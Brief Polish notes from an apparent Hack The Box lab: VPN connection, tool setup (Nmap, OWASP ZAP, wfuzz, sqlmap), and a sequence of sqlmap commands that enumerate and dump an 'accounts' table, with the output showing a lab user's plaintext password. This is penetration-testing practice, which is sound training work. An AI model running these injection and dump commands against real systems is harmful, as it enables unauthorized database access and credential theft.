Łączenie się z serwerem:

```sh
sudo openvpn --config machines_eu-2.ovpn
```

- Instalacja:
- Przeglądarka: Firefox, pobierz plik ręcznie
    - `wget https://download-installer.cdn.mozilla.net/pub/firefox/releases/151.0.2/linux-x86_64/en-US/firefox-151.0.2.tar.xz`
    - `tar -xf firefox-151.0.2.tar.xz`
    - `./firefox/firefox`
- Port Scanner: Nmap
- Ogólny skaner i powtarzacz: OWASP ZAP
    - fuzzer oczekuje, że regex będzie wyglądał tak [a-z]
- Ataki słownikowe: wfuzz
    - Listy: /usr/share/wordlists/fuzzdb/
- SQL: sqlmap
    - `$ sqlmap -u "http://localhost:8081/?id=1" --batch --dbs `
    - `$ sqlmap -u "http://localhost:8081/?id=1" -D soccer_db --batch --tables`
    - `$ sqlmap -u "http://localhost:8081/?id=1" -D soccer_db -T accounts --batch --dump`
    - ```sh
        Database: soccer_db
        Table: accounts
        [1 entry]
        +------+-------------------+----------------------+----------+
        | id   | email             | password             | username |
        +------+-------------------+----------------------+----------+
        | 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
        +------+-------------------+----------------------+----------+
      ```